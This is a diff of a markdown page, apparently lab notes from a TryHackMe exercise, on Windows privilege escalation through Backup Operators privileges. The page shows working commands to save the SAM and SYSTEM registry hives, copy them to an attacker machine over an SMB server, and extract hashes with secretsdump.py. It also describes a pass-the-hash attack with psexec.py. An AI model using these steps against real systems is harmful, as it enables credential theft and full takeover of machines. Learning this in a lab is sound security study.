@@ -8,14 +8,14 @@ sidebar_position: 1
 
 - **[METHOD]** Copying the `SAM` and `SYSTEM` Registry Hives to extract the local Administrator's Password HASH.
 
+---
 
 <br/>
 
----
 
 
-- This Account is part of the **`Backup Operators` Group** which by default is granted the `SeBackup` and `SeRestore` Privileges.
-- <b style={{ color: 'Red' }}>[NOTE]</b> The Command Prompt needs to be open as <b style={{ color: 'Red' }}>Administrator</b> 
+- This Account is part of the **`Backup Operators` Group** which by default is granted the <b style={{ color: 'Brown' }}>[SeBackup - SeRestore]</b> Privileges.
+- <b style={{ color: 'Red' }}>[NOTE]</b> The <span style={{fontWeight: 'Bold'}}>Command Prompt</span> needs to be open as <b style={{ color: 'Red' }}>Administrator</b> 
 
 ```log
 C:\> whoami /priv
@@ -42,16 +42,16 @@ C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
 
 <br/>
 
-- Copying the Files to the **Attacker Machine.**
+- Copying the Files to the **Attacker Machine** using a simple `SMB` Server.
 
 ```bash
-attacker@machine:~$ mkdir share
-attacker@machine:~$ smbserver.py -smb2support -username USER_NAME -password PASSWORD public share
+attacker@machine:~$ mkdir SHARE
+attacker@machine:~$ smbserver.py -smb2support -username USER_NAME -password PASSWORD public SHARE
 ```
 
 <br/>
 
-- Using `secretsdump.py` to Retrive the User Password Hashes.
+- Using <b style={{ color: 'Coral' }}>secretsdump.py</b> to Retrive the User Password Hashes.
 
 ```log
 attacker@machine:~$ secretsdump.py -sam sam.hive -system system.hive LOCAL
@@ -64,7 +64,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 <br/>
 
-- Using `psexec.py`
+- Using <b style={{ color: 'Coral' }}>psexec.py</b>
 - Using **`Administrator`** HASH to perform a **`Pass-the-Hash`** Attack and gain Access to the Target Machine with <b style={{ color: 'Red' }}>SYSTEM</b> Privileges.
 
 
